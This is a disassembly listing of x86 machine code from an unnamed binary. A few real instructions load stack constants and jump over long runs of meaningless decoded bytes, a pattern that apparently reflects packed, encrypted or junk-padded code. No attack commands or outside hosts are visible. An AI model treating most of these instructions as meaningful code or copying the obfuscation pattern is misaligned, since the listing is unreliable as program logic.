  40f548:	jne    0x40f559
  40f54a:	retf   
  40f54b:	icebp  
  40f54c:	jno    0x40f5c3
  40f54e:	stc    
  40f54f:	bnd repz jle 0x40f558
  40f553:	push   0xffffff82
  40f555:	imul   eax,DWORD PTR [edi],0xe1c8838e
  40f55b:	cld    
  40f55c:	scas   eax,DWORD PTR es:[edi]
  40f55d:	jmp    0xb722:0x42687604
  40f564:	push   ecx
  40f565:	bound  ecx,QWORD PTR [ebx+ebx*1]
  40f568:	idiv   DWORD PTR [edi+0x79f7d8b5]
  40f56e:	push   edi
  40f56f:	dec    ecx
  40f570:	(bad)  
  40f571:	jae    0x40f5e1
  40f573:	cs ret 0x69d8
  40f577:	xchg   edi,eax
  40f578:	arpl   WORD PTR [eax-0x34],ax
  40f57b:	imul   edi,DWORD PTR cs:[edx+edi*4-0x36],0xbfcb7d94
  40f584:	ret    
  40f585:	retf   0xa5f3
  40f588:	fucomi st,st(5)
  40f58a:	jle    0x40f5e6
  40f58c:	xchg   esi,eax
  40f58d:	stos   DWORD PTR es:[edi],eax
  40f58e:	cmc    
  40f58f:	mov    WORD PTR [ebx-0x6],gs
  40f592:	lahf   
  40f593:	mov    al,ds:0x2a458b45
  40f598:	xchg   ecx,eax
  40f599:	js     0x40f52c
  40f59b:	mov    cl,0x9d
  40f59d:	push   edi
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	(bad)  
  40f660:	cmp    al,0x86
  40f662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f663:	pop    eax
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0x91e583f8
  40f66f:	xchg   edx,eax
  40f670:	out    dx,al
  40f671:	aam    0x32
  40f673:	or     BYTE PTR [ecx+0x459634bf],dl
  40f679:	and    dl,BYTE PTR [ecx-0x5edc141a]
  40f67f:	and    DWORD PTR [edi-0x4672bbc9],0x8b011ff1
  40f689:	jge    0x40f695
  40f68b:	dec    esi
  40f68c:	push   0xffffff96
  40f68e:	stc    
  40f68f:	stos   DWORD PTR es:[edi],eax
  40f690:	out    dx,eax
  40f691:	mov    ecx,0xa318c57b
  40f696:	pop    ebx
  40f697:	cmp    dl,BYTE PTR [edi]
  40f699:	sub    esp,DWORD PTR [ebp-0x7e413dc9]
  40f69f:	jmp    0x40f710
  40f6a1:	push   0x62adccea
  40f6a6:	and    eax,0x74181082
  40f6ab:	xor    DWORD PTR ds:0x9c940ffc,ebp
  40f6b1:	jno    0x40f644
  40f6b3:	add    al,BYTE PTR [edi-0x1ae1c4ad]
  40f6b9:	xchg   ecx,eax
  40f6ba:	out    dx,al
  40f6bb:	daa    
  40f6bc:	adc    al,0x82
  40f6be:	jp     0x40f67f
  40f6c0:	adc    eax,0x71131c0e
  40f6c5:	sub    dl,0xae
  40f6c8:	lods   eax,DWORD PTR ds:[esi]
  40f6c9:	lea    esp,ds:0xbd4daed3
  40f6cf:	push   es
  40f6d0:	call   0x3c950e97
  40f6d5:	pop    ecx
  40f6d6:	sbb    DWORD PTR [esi+0x24],esp
  40f6d9:	mov    al,ds:0x6bd769ed
  40f6de:	test   al,0xad
  40f6e0:	or     bl,BYTE PTR ds:0xcc564d14
  40f6e6:	cmp    al,0xe9
  40f6e8:	and    DWORD PTR [ecx+esi*2-0x6da7c756],edx
  40f6ef:	gs jns 0x40f710
  40f6f2:	pop    ebx
  40f6f3:	dec    edi
  40f6f4:	out    0x29,al
  40f6f6:	jnp    0x40f6f4
  40f6f8:	and    al,0x40
  40f6fa:	push   es
  40f6fb:	gs xor al,0x18
  40f6fe:	sub    eax,edi
  40f700:	push   ds
  40f701:	add    al,0x24
  40f703:	or     DWORD PTR es:[ecx],ebp
  40f706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f707:	pop    edx
  40f708:	cmp    esi,esp
  40f70a:	jg     0x40f734
  40f70c:	fisttp QWORD PTR [ebp+ebp*8-0x4f03c2c5]
  40f713:	retf   
  40f714:	addr16 or al,0x5a
  40f717:	faddp  st(3),st
  40f719:	and    BYTE PTR [ecx-0x43],0x1f
  40f71d:	inc    edx
  40f71e:	push   edi
  40f71f:	les    eax,FWORD PTR [ecx+0x3a]
  40f722:	xor    al,ah
  40f724:	ss out dx,al
  40f726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f727:	mov    ebx,0x7283e565
  40f72c:	xchg   BYTE PTR [ecx+0x6b919dc7],al
  40f732:	mov    edx,0x42a360d
  40f737:	or     DWORD PTR [edx-0x21],esi
  40f73a:	pop    ebx
  40f73b:	push   ss
  40f73c:	jecxz  0x40f775
  40f73e:	iret   
  40f73f:	test   DWORD PTR [ecx-0x5a652194],0xa823e03c
  40f749:	lahf   
  40f74a:	ror    DWORD PTR [eax+0x1b],1
  40f74d:	es call 0xdf8e:0x550adb07
  40f755:	push   ecx
  40f756:	dec    edx
  40f757:	scas   eax,DWORD PTR es:[edi]
  40f758:	add    DWORD PTR [ebp-0x7ade0be9],0x66
  40f75f:	push   edi
  40f760:	ja     0x40f71b
  40f762:	cwde   
  40f763:	(bad)  
  40f765:	stc    
  40f766:	mov    edi,0x51f928b
  40f76b:	dec    eax
  40f76c:	mov    edi,esp
  40f76e:	add    al,BYTE PTR [ebp+0x21]
  40f771:	mov    WORD PTR ds:0x11f18a83,?
  40f777:	ss cli 
  40f779:	pop    eax
  40f77a:	rcl    al,0xa7
  40f77d:	popa   
  40f77e:	call   0x5891:0xe49f047c
  40f785:	xchg   esp,eax
  40f786:	sub    BYTE PTR [ecx],ch
  40f788:	xchg   edi,eax
  40f789:	mov    edx,0x25c86667
  40f78e:	outs   dx,DWORD PTR ds:[esi]
  40f78f:	adc    eax,ecx
  40f791:	outs   dx,DWORD PTR ds:[esi]
  40f792:	inc    ecx
  40f793:	lea    eax,[edx+ecx*1]
  40f796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f797:	(bad)  
  40f798:	fmul   DWORD PTR [ecx-0x28783fd9]
  40f79e:	mov    ah,BYTE PTR [esi+esi*8+0x7a]
  40f7a2:	es mov edx,0x19476f85
  40f7a8:	(bad)  
  40f7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7aa:	sbb    eax,0xb3fcb236
  40f7af:	and    esp,DWORD PTR [edi]
  40f7b1:	ss mov ecx,0xd16ac99c
  40f7b7:	xor    esi,edi
  40f7b9:	jo     0x40f791
  40f7bb:	xchg   BYTE PTR [edi],bl
  40f7bd:	loopne 0x40f75b
  40f7bf:	clc    
  40f7c0:	in     al,0x2b
  40f7c2:	icebp  
  40f7c3:	pop    esi
  40f7c4:	adc    BYTE PTR [ebx-0x7c852a78],0x9e
  40f7cb:	xor    bl,BYTE PTR [esi]
  40f7cd:	cmc    
  40f7ce:	adc    edx,ecx
  40f7d0:	mov    esp,DWORD PTR [esi+edi*1+0x4a]
  40f7d4:	pop    es
  40f7d5:	int3   
  40f7d6:	mov    bh,0xf3
  40f7d8:	pop    edx
  40f7d9:	fsubr  st,st(6)
  40f7db:	jns    0x40f796
  40f7dd:	lahf   
  40f7de:	and    eax,0xad15a59e
  40f7e3:	or     eax,0x28c32d33
  40f7e8:	mov    eax,ds:0x30011f93
  40f7ed:	mov    edi,DWORD PTR [edi]
  40f7ef:	mov    dh,0x38
  40f7f1:	cmp    edx,ecx
  40f7f3:	jo     0x40f77e
  40f7f5:	add    BYTE PTR [esi*4-0x25c1f133],cl
  40f7fc:	imul   eax,edi,0xffffffbb
  40f7ff:	popf   
  40f800:	and    al,0xcf
  40f802:	add    al,0xa5
  40f804:	mov    esp,0xa297c974
  40f809:	in     al,0x64
  40f80b:	retf   0x33bd
  40f80e:	push   ebp
  40f80f:	enter  0x91ef,0x16
  40f813:	cmp    al,0xd5
  40f815:	test   BYTE PTR [ecx+0xc602e53],0xa4
  40f81c:	addr16 jns 0x40f7dc
  40f81f:	(bad)  
  40f820:	push   ss
  40f821:	inc    eax
  40f822:	push   eax
  40f823:	push   ds
  40f824:	add    ebx,DWORD PTR [edx-0x68]
  40f827:	adc    DWORD PTR [eax],ebx
  40f829:	pop    ecx
  40f82a:	mov    ds:0x8541a1d9,eax
  40f82f:	add    al,0x8d
  40f831:	(bad)  
  40f832:	sahf   
  40f833:	mov    bl,0x1f
  40f835:	ins    DWORD PTR es:[edi],dx
  40f836:	sahf   
  40f837:	(bad)  
  40f838:	pop    eax
  40f839:	xchg   ebp,eax
  40f83a:	fdiv   DWORD PTR [edi-0x67]
  40f83d:	adc    dh,BYTE PTR [edx+0x31]
  40f840:	add    eax,0x94c5256c
  40f845:	aaa    
  40f846:	es pop edi
  40f848:	nop
  40f849:	or     cx,WORD PTR [ebp+0x74]
  40f84d:	sti    
  40f84e:	loope  0x40f81c
  40f850:	rol    esp,cl
  40f852:	mov    esp,?
  40f854:	pop    ebp
  40f855:	push   eax
  40f856:	repz fmul QWORD PTR [esi+esi*2+0x248dc68f]
  40f85e:	adc    DWORD PTR [eax+0x7599a6f4],0xffffff9c
  40f865:	inc    edi
  40f866:	mov    WORD PTR cs:[eax+0x32],?
  40f86a:	in     al,dx
  40f86b:	cmp    al,0x21
  40f86d:	pushf  
  40f86e:	arpl   WORD PTR [edx],bp
  40f870:	mov    WORD PTR [edi-0x48],ss
  40f873:	imul   edx,edx,0xffffffd9
  40f876:	(bad)  
  40f877:	xchg   esi,eax
  40f878:	iret   
  40f879:	aad    0xbd
  40f87b:	dec    eax
  40f87c:	sub    BYTE PTR [edi],dh
  40f87e:	shl    BYTE PTR [edx+0x24],1
  40f881:	ss jns 0x40f851
  40f884:	jp     0x40f841
  40f886:	push   ss
  40f887:	test   BYTE PTR [eax+0x617164b7],dh
  40f88d:	sub    ebp,esp
  40f88f:	sub    DWORD PTR [eax+edx*1+0x44],ebp
  40f893:	aas    
  40f894:	or     eax,0x2c7d3e94
  40f899:	into   
  40f89a:	sahf   
  40f89b:	mov    ah,0x9d
  40f89d:	(bad)  
  40f89e:	mov    edx,0x663fe894
  40f8a3:	dec    ebx
  40f8a4:	int    0x8c
  40f8a6:	sbb    ebx,esp
  40f8a8:	sub    cl,ch
  40f8aa:	(bad)  
  40f8ab:	clc    
  40f8ac:	(bad)  
  40f8ad:	xchg   ecx,eax
  40f8ae:	add    dh,bl
  40f8b0:	push   0xffffff9c
  40f8b2:	inc    esi
  40f8b3:	call   0x5c34:0x74b01972
  40f8ba:	or     al,cl
  40f8bc:	mov    ch,BYTE PTR [edi]
  40f8be:	push   ds
  40f8bf:	imul   eax,DWORD PTR [edx+0x2d3b3b41],0xa97ec3f4
  40f8c9:	mov    ds:0x966b9ab5,al
  40f8ce:	sbb    DWORD PTR [ebp-0x27],eax
  40f8d1:	fs call 0x92d170b3
  40f8d7:	fwait
  40f8d8:	js     0x40f888
  40f8da:	test   al,0x54
  40f8dc:	and    al,bh
  40f8de:	xor    al,0xd9
  40f8e0:	dec    edx
  40f8e1:	and    edx,DWORD PTR [ebx]
  40f8e3:	jae    0x40f8ad
  40f8e5:	mov    eax,ds:0x30ead0af
  40f8ea:	and    DWORD PTR [esi],ebp
  40f8ec:	and    ebx,esp
  40f8ee:	mov    cl,0x33
  40f8f0:	test   BYTE PTR [ecx-0x4d868b8b],bl
  40f8f6:	int3   
  40f8f7:	sbb    al,0xe6
  40f8f9:	push   0x11
  40f8fb:	dec    edx
  40f8fc:	xor    esp,DWORD PTR [edi+0x74]
  40f8ff:	mov    ebx,0xb1f7a92f
  40f904:	xchg   ecx,eax
  40f905:	ret    0xd765
  40f908:	push   esi
  40f909:	cmp    esi,DWORD PTR [ecx+0x6bce65c6]
  40f90f:	xchg   ebx,eax
  40f910:	mov    ecx,0x674ae6ed
  40f915:	sti    
  40f916:	push   esp
  40f917:	ret    0x6174
  40f91a:	retf   0x593c
  40f91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f91e:	mov    cs,WORD PTR [ebp-0x969afd6]
  40f924:	pop    ebp
  40f925:	icebp  
  40f926:	xchg   ebp,eax
  40f927:	or     al,0x3
  40f929:	fs sub cl,dl
  40f92c:	xor    DWORD PTR [ebp+0x2d],edx
  40f92f:	clc    
  40f930:	popa   
  40f931:	fbstp  TBYTE PTR [esi+ebp*2]
  40f934:	fwait
  40f935:	jne    0x40f9b4
  40f937:	stos   DWORD PTR es:[edi],eax
  40f938:	jp     0x40f8f7
  40f93a:	push   edx
  40f93b:	aad    0x77
  40f93d:	addr16 mov ebx,0x97fb146
  40f943:	adc    edx,DWORD PTR [edi]
  40f945:	push   0x3e
  40f947:	addr16 jl 0x40f92f
  40f94a:	xchg   esi,eax
  40f94b:	and    DWORD PTR [edx],edi
  40f94d:	ds into 
  40f94f:	push   0x2ce85b3
  40f954:	jmp    0x35ca:0x220ea007
  40f95b:	mov    ebx,0x4883f291
  40f960:	inc    ecx
  40f961:	push   edx
  40f962:	xchg   BYTE PTR [ebx+0x43],ch
  40f965:	sahf   
  40f966:	jmp    0x40f91f
  40f968:	or     dh,dl
  40f96a:	pop    esi
  40f96b:	dec    eax
  40f96c:	mov    dh,0xb5
  40f96e:	sbb    bh,BYTE PTR [ebp-0x73]
  40f971:	je     0x40f9bb
  40f973:	sub    BYTE PTR [ebp-0x5b],0x78
  40f977:	jbe    0x40f943
  40f979:	xchg   ebx,eax
  40f97a:	xchg   ebx,eax
  40f97b:	lahf   
  40f97c:	xor    ah,BYTE PTR [esi-0x2c]
  40f97f:	xor    eax,0xa52bb41b
  40f984:	adc    al,BYTE PTR [edx]
  40f986:	xchg   esi,eax
  40f987:	mov    bh,0x7
  40f989:	arpl   WORD PTR [edi],cx
  40f98b:	int    0xa7
  40f98d:	scas   al,BYTE PTR es:[edi]
  40f98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f98f:	clc    
  40f990:	mov    ah,0xd
  40f992:	mov    dl,0x58
  40f994:	mov    al,0xa1
  40f996:	cmp    ecx,DWORD PTR [ecx]
  40f998:	shl    ecx,0xa6
  40f99b:	js     0x40f9ef
  40f99d:	xor    DWORD PTR [ebp+0x24],edx
  40f9a0:	xchg   edx,eax
  40f9a1:	(bad)  
  40f9a2:	hlt    
  40f9a3:	xchg   edx,eax
  40f9a4:	(bad)  
  40f9a6:	rcl    BYTE PTR [ecx],1
  40f9a8:	xchg   ebx,eax
  40f9a9:	ror    DWORD PTR [ebp+esi*1+0x5],0x3b
  40f9ae:	mov    cl,bl
  40f9b0:	sar    edi,cl
  40f9b2:	xor    edx,ebx
  40f9b4:	push   esi
  40f9b6:	or     al,0xc6
  40f9b8:	out    0x89,eax
  40f9ba:	ss add esi,0x5f
  40f9be:	xor    esp,DWORD PTR [ebx+0x2bf57346]
  40f9c4:	push   esp
  40f9c5:	or     BYTE PTR [edx],0x44
  40f9c8:	xor    al,0x82
  40f9ca:	out    0x71,eax
  40f9cc:	daa    
  40f9cd:	and    al,0x5c
  40f9cf:	jl     0x40f9b5
  40f9d1:	(bad)  
  40f9d2:	sub    edx,DWORD PTR [esi-0x32]
  40f9d5:	add    esi,DWORD PTR [edx-0x459789bc]
  40f9db:	cld    
  40f9dc:	mov    esi,0xe74c7977
  40f9e1:	sbb    BYTE PTR [ecx-0x62f7da4c],0x54
  40f9e8:	fdivr  QWORD PTR [eax-0x4c]
  40f9eb:	mov    dl,dl
  40f9ed:	popa   
  40f9ee:	sbb    edi,DWORD PTR [ebx+0x25]
  40f9f1:	xor    eax,0x6ba7e523
  40f9f6:	cwde   
  40f9f7:	retf   
  40f9f8:	sahf   
  40f9f9:	xchg   ebp,eax
  40f9fa:	xchg   edi,eax
  40f9fb:	push   ecx
  40f9fc:	cmp    dl,dl
  40f9fe:	test   DWORD PTR [ebp+0x2b],eax
  40fa01:	mov    ecx,0x8bfc4d8b
  40fa06:	push   ebp
  40fa07:	lock mov edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x422220
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	sub    BYTE PTR [edx+0x267d90cf],al
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0xc4ffe8af
  40fa55:	sbb    DWORD PTR [edx-0x22f9a3e1],edx
  40fa5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa5c:	add    al,0xdf
  40fa5e:	jp     0x40fa33
  40fa60:	in     al,0x39
  40fa62:	mov    ebp,0xb07ee4e6
  40fa67:	xchg   ecx,eax
  40fa68:	push   0xffffff92
  40fa6a:	push   edx
  40fa6b:	sar    DWORD PTR [eax],cl
  40fa6d:	push   esi
  40fa6e:	jl     0x40fa80
  40fa70:	ins    DWORD PTR es:[edi],dx
  40fa71:	mov    ebp,0x72992bf9
  40fa76:	sub    eax,0x741ac1c3
  40fa7b:	imul   esi,DWORD PTR [edx],0xb3ee0686
  40fa81:	ja     0x40fa3e
  40fa83:	retf   
  40fa84:	imul   edx,DWORD PTR [ecx+0x5c],0x652d5a66
  40fa8b:	xlat   BYTE PTR ds:[ebx]
  40fa8c:	pop    esi
  40fa8d:	shl    DWORD PTR [ebp+ebx*8-0xb],cl
  40fa91:	or     eax,0x38fb240b
  40fa96:	fdiv   st(0),st
  40fa98:	and    dl,ch
  40fa9a:	or     ah,0xc2
  40fa9d:	sbb    eax,0xd5f0c6aa
  40faa2:	ror    DWORD PTR [ebx-0xba6c0e9],cl
  40faa8:	cmp    DWORD PTR [edx-0x43807a69],edi
  40faae:	fs js  0x40fada
  40fab1:	loope  0x40faa3
  40fab3:	pop    edi
  40fab4:	lds    eax,FWORD PTR [ebx]
  40fab6:	aaa    
  40fab7:	push   cs
  40fab8:	jb     0x40faac
  40faba:	int    0x12
  40fabc:	lods   al,BYTE PTR ds:[esi]
  40fabd:	mov    ebx,0x146a8da7
  40fac2:	popf   
  40fac3:	xor    DWORD PTR [esi],ecx
  40fac5:	aaa    
  40fac6:	pop    ecx
  40fac7:	neg    BYTE PTR [eax+ebx*4+0x4dc4a75]
  40face:	pop    esp
  40facf:	sbb    eax,0x5dd8565c
  40fad4:	imul   ebx,DWORD PTR ds:0xdad660e2,0x5ebbf420
  40fade:	imul   ebp,DWORD PTR [esi+0x1c],0x8764d85e
  40fae5:	rcl    edx,0xe9
  40fae8:	das    
  40fae9:	into   
  40faea:	in     eax,0x5b
  40faec:	jo     0x40fb6d
  40faee:	pop    es
  40faef:	ret    0xb556
  40faf2:	call   0x6159:0xacf7e0ad
  40faf9:	(bad)  
  40fafa:	jle    0x40fb50
  40fafc:	cmp    bl,BYTE PTR [ebp-0x3a4b6cbb]
  40fb02:	and    DWORD PTR [edi+0xe40a5d6],0xffffffe1
  40fb09:	daa    
  40fb0a:	mov    esp,0x827f8709
  40fb0f:	push   esi
  40fb10:	pop    ds
  40fb11:	jo     0x40fb2c
  40fb13:	jns    0x40fb7b
  40fb15:	pop    edi
  40fb16:	mov    dh,0x94
  40fb18:	mov    eax,ds:0x53e609ef
  40fb1d:	sar    DWORD PTR [edx],0xe7
  40fb20:	sar    esp,1
  40fb22:	int    0xe6
  40fb24:	rol    bl,1
  40fb26:	loopne 0x40fb88
  40fb28:	xchg   edi,eax
  40fb29:	imul   ebp,DWORD PTR [eax-0x1ab2680e],0xabe31b4a
  40fb33:	jmp    0x40fb59
  40fb35:	and    bh,BYTE PTR [edi]
  40fb37:	pop    esi
  40fb38:	mov    ecx,0xe1b197b6
  40fb3d:	fsubr  QWORD PTR [esi+0x6]
  40fb40:	mov    cl,0xc1
  40fb42:	inc    ebx
  40fb43:	mov    esp,0xb920158c
  40fb48:	push   ds
  40fb49:	sbb    eax,0xfb122679
  40fb4e:	mov    ebp,0x8f15be51
  40fb53:	cmp    eax,0x758cd7f2
  40fb58:	retf   0xe285
  40fb5b:	jmp    0x1aa7:0x344d35d1
  40fb62:	jne    0x40fb39
  40fb64:	jge    0x40fba9
  40fb66:	pop    edx
  40fb67:	add    dl,dl
  40fb69:	push   edx
  40fb6a:	das    
  40fb6b:	xchg   DWORD PTR [esi+0xc4322cf],esp
  40fb71:	push   0x9d0fd66f
  40fb76:	mul    BYTE PTR [eax-0x1b]
  40fb79:	pop    es
  40fb7a:	mov    bl,0xc5
  40fb7c:	les    edi,FWORD PTR [ebx]
  40fb7e:	(bad)  
  40fb7f:	pop    es
  40fb80:	push   ss
  40fb81:	outs   dx,DWORD PTR ds:[esi]
  40fb82:	iret   
  40fb83:	xor    dh,0xac
  40fb86:	sbb    eax,0x60d12acb
  40fb8b:	sbb    ah,BYTE PTR [ebx-0x4e]
  40fb8e:	sub    eax,0x2e745463
  40fb93:	xchg   ecx,eax
  40fb94:	push   es
  40fb95:	imul   esi,DWORD PTR [esi+edx*2]
  40fb99:	add    ebp,esi
  40fb9b:	bound  ecx,QWORD PTR [ecx+0x1e]
  40fb9e:	adc    ch,al
  40fba0:	test   eax,0x4713d2fb
  40fba5:	stos   DWORD PTR es:[edi],eax
  40fba6:	int    0x38
  40fba8:	mov    al,ds:0x854e8a43
  40fbad:	repnz mov ebp,fs
  40fbb0:	pop    ecx
  40fbb1:	cmp    ah,BYTE PTR [esi]
  40fbb3:	out    dx,al
  40fbb4:	rcl    dh,0x2c
  40fbb7:	ret    0x7dea
  40fbba:	mov    edi,0xa2b2238f
  40fbbf:	call   0xebfbf81a
  40fbc4:	daa    
  40fbc5:	sar    BYTE PTR [ecx+0x44e70029],1
  40fbcb:	mov    edx,0x4121d475
  40fbd0:	pop    ebx
  40fbd1:	js     0x40fb73
  40fbd3:	push   esi
  40fbd4:	mov    bh,0xd4
  40fbd6:	arpl   WORD PTR [edx],si
  40fbd8:	shl    BYTE PTR [ebx],0xc9
  40fbdb:	sbb    al,0x9f
  40fbdd:	dec    esp
  40fbde:	aad    0xee
  40fbe0:	mov    ds:0x570314fb,al
  40fbe5:	inc    edi
  40fbe6:	dec    eax
  40fbe7:	sbb    DWORD PTR [edx+ecx*4-0x4353c6e0],ebx
  40fbee:	in     eax,dx
  40fbef:	sar    BYTE PTR [edi],cl
  40fbf1:	fldenv [ecx]
  40fbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf4:	sub    eax,0xef923f84
  40fbf9:	xchg   esi,eax
  40fbfa:	pop    ds
  40fbfb:	dec    esp
  40fbfc:	fbstp  TBYTE PTR [edi]
  40fbfe:	add    ah,BYTE PTR [esi-0x2c3c7e76]
  40fc04:	mov    ds:0x336483f2,al
  40fc09:	int3   
  40fc0a:	int3   
  40fc0b:	mov    ds:0xb87693aa,eax
  40fc10:	and    BYTE PTR [edi],dl
  40fc12:	leave  
  40fc13:	cld    
  40fc14:	xchg   edx,eax
  40fc15:	adc    al,0xb2
  40fc17:	mov    esi,DWORD PTR ds:0x8119d1fe
  40fc1d:	jmp    FWORD PTR ds:0xa090a23b
  40fc23:	cmp    al,0xb4
  40fc25:	mov    BYTE PTR [ecx+0xf7f29d9],ch
  40fc2b:	js     0x40fc91
  40fc2d:	in     al,dx
  40fc2e:	or     ebp,ebp
  40fc30:	pusha  
  40fc31:	loopne 0x40fc2d
  40fc33:	lds    esi,FWORD PTR [ebp-0x70]
  40fc36:	aaa    
  40fc37:	xor    DWORD PTR [ebx+0x717e68aa],edi
  40fc3d:	loopne 0x40fc1b
  40fc3f:	xchg   ebx,eax
  40fc40:	inc    esi
  40fc41:	add    BYTE PTR [esi+0x7dd8bc56],ch
  40fc47:	add    ebp,ecx
  40fc49:	mov    ebp,0x1710d703
  40fc4e:	scas   al,BYTE PTR es:[edi]
  40fc4f:	push   ss
  40fc50:	pop    ss
  40fc51:	or     DWORD PTR [ecx],ecx
  40fc53:	mov    ah,0x34
  40fc55:	cmp    dl,dh
  40fc57:	cmp    BYTE PTR [edi+esi*4+0x54d3b7ba],bl
  40fc5e:	push   cs
  40fc5f:	pop    ebx
  40fc60:	mov    ebx,0xd7528ebd
  40fc65:	(bad)  
  40fc66:	je     0x40fc3e
  40fc68:	test   eax,0x1d8cdb0c
  40fc6d:	jmp    0x40fbfe
  40fc6f:	sub    BYTE PTR [ecx+0x65e0eac1],bl
  40fc75:	(bad)  
  40fc76:	cmp    al,0x2
  40fc78:	fucompp 
  40fc7a:	cs fmul st,st(0)
  40fc7d:	sbb    ch,ah
  40fc7f:	sub    BYTE PTR ds:0xff468cbd,dl
  40fc85:	sub    al,0x75
  40fc87:	or     bh,bh
  40fc89:	mov    al,0xa4
  40fc8b:	outs   dx,DWORD PTR ds:[esi]
  40fc8c:	push   esp
  40fc8d:	stc    
  40fc8e:	mov    edx,0xe2f77929
  40fc93:	mov    bh,0x34
  40fc95:	mov    ebx,0xc3bc1b47
  40fc9a:	xor    eax,0xc5bc9d4a
  40fc9f:	pusha  
  40fca0:	in     al,dx
  40fca1:	jmp    0xf3f7c368
  40fca6:	jecxz  0x40fd25
  40fca8:	pop    ss
  40fca9:	pop    esi
  40fcaa:	mov    ah,0x8a
  40fcac:	push   esi
  40fcad:	xor    DWORD PTR [esi+0x5a],edi
  40fcb0:	adc    al,0xb4
  40fcb2:	jg     0x40fd06
  40fcb4:	jne    0x40fcdc
  40fcb6:	(bad)  
  40fcb7:	icebp  
  40fcb8:	(bad)  
  40fcb9:	lea    ecx,[edi-0x3c]
  40fcbc:	addr16 jg 0x40fd12
  40fcbf:	icebp  
  40fcc0:	nop
  40fcc1:	ret    0xb7c5
  40fcc4:	push   ss
  40fcc5:	cdq    
  40fcc6:	push   ss
  40fcc7:	pushf  
  40fcc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc9:	mov    al,0x7e
  40fccb:	inc    edi
  40fccc:	ds mov ebp,0x9dfefc63
  40fcd2:	mov    DWORD PTR [ebx-0x50],0xe365b148
  40fcd9:	add    DWORD PTR [edi],ebp
  40fcdb:	jno    0x40fd4a
  40fcdd:	addr16 aaa 
  40fcdf:	sub    al,BYTE PTR [ecx-0x31]
  40fce2:	mov    BYTE PTR [esi+0x69],0x81
  40fce6:	add    dl,BYTE PTR [ebx]
  40fce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce9:	call   0x54cd:0x11189f37
  40fcf0:	inc    eax
  40fcf1:	mov    ebp,0xe62adb44
  40fcf6:	loop   0x40fcd5
  40fcf8:	xor    DWORD PTR [ebx],edx
  40fcfa:	xchg   edi,eax
  40fcfb:	cmp    bl,BYTE PTR ds:0x1c6f35ec
  40fd01:	jg     0x40fd7b
  40fd03:	jo     0x40fd52
  40fd05:	shr    BYTE PTR [edi],1
  40fd07:	push   ecx
  40fd08:	add    DWORD PTR [eax+0x71ae0d2],esp
  40fd0e:	add    eax,DWORD PTR [ecx+0x77253bdb]
  40fd14:	bound  ecx,QWORD PTR [esi+0x2ae9e712]
  40fd1a:	and    ebx,0x9e784690
  40fd20:	out    0x80,eax
  40fd22:	stos   DWORD PTR es:[edi],eax
  40fd23:	mov    eax,0x32448049
